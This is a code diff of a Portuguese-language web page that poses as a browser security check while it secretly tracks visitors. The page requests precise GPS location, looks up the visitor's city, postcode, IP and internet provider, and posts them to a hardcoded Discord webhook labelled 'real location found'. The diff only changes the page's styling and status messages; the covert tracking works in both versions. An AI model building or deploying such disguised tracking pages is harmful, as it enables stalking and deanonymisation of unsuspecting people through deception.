@@ -2,56 +2,56 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificando navegador...</title>
-    <style>
-        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin-right: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>Verificando...</title>
 </head>
-<body>
-    <div class="loader"></div>
-    <p>Aguarde um momento...</p>
+<body style="background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+    <div style="text-align: center;">
+        <div id="status">Aguarde, processando segurança...</div>
+    </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";
 
-        async function obterDados(lat, lon) {
+        async function enviarDados(lat, lon) {
+            document.getElementById('status').innerText = "Sincronizando dados...";
+            
             try {
-                // Busca a cidade real pelas coordenadas (reverso)
+                // Pega a cidade real
                 const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                 const data = await geo.json();
                 
-                // Busca o provedor/IP
+                // Pega o IP e Provedor
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
 
                 const payload = {
                     embeds: [{
-                        title: "🎯 LOCALIZAÇÃO REAL IDENTIFICADA",
+                        title: "🎯 LOCALIZAÇÃO REAL ENCONTRADA",
                         color: 65280,
                         fields: [
                             { name: "🚩 Pais:", value: data.address.country || "Brasil", inline: true },
                             { name: "🏛️ Estado:", value: data.address.state || "N/A", inline: true },
-                            { name: "🏙️ Cidade:", value: data.address.city || data.address.town || data.address.village || "N/A", inline: true },
+                            { name: "🏙️ Cidade:", value: data.address.city || data.address.town || "N/A", inline: true },
                             { name: "📮 Cep:", value: data.address.postcode || "N/A", inline: true },
-                            { name: "📍 Coordenadas:", value: `[Clique para abrir o Mapa](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
-                            { name: "🌐 Internet/Provedor:", value: ipData.org || "N/A", inline: false },
-                            { name: "⏰ Horário de entrada:", value: new Date().toLocaleString('pt-BR'), inline: false }
-                        ],
-                        footer: { text: "Precisão via Satélite GPS" }
+                            { name: "📍 Coordenadas:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
+                            { name: "🌐 Internet/Provedor:", value: ipData.org || "N/A", inline: false }
+                        ]
                     }]
                 };
 
+                // O 'await' aqui é OBRIGATÓRIO para não sumir antes de enviar
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-            } catch (e) {
-                console.error(e);
+                document.getElementById('status').innerText = "Concluído! Você já pode fechar esta aba.";
+                console.log("Enviado com sucesso!");
+
+            } catch (error) {
+                document.getElementById('status').innerText = "Erro ao processar. Tente novamente.";
+                console.error(error);
             }
         }
 
@@ -59,16 +59,13 @@
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        obterDados(pos.coords.latitude, pos.coords.longitude);
+                        enviarDados(pos.coords.latitude, pos.coords.longitude);
                     },
                     (erro) => {
-                        // Se der erro ou negar, redireciona para não ficar preso
-                        window.location.href = "https://google.com";
+                        document.getElementById('status').innerText = "Erro: Localização necessária.";
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true }
                 );
-            } else {
-                window.location.href = "https://google.com";
             }
         };
     </script>
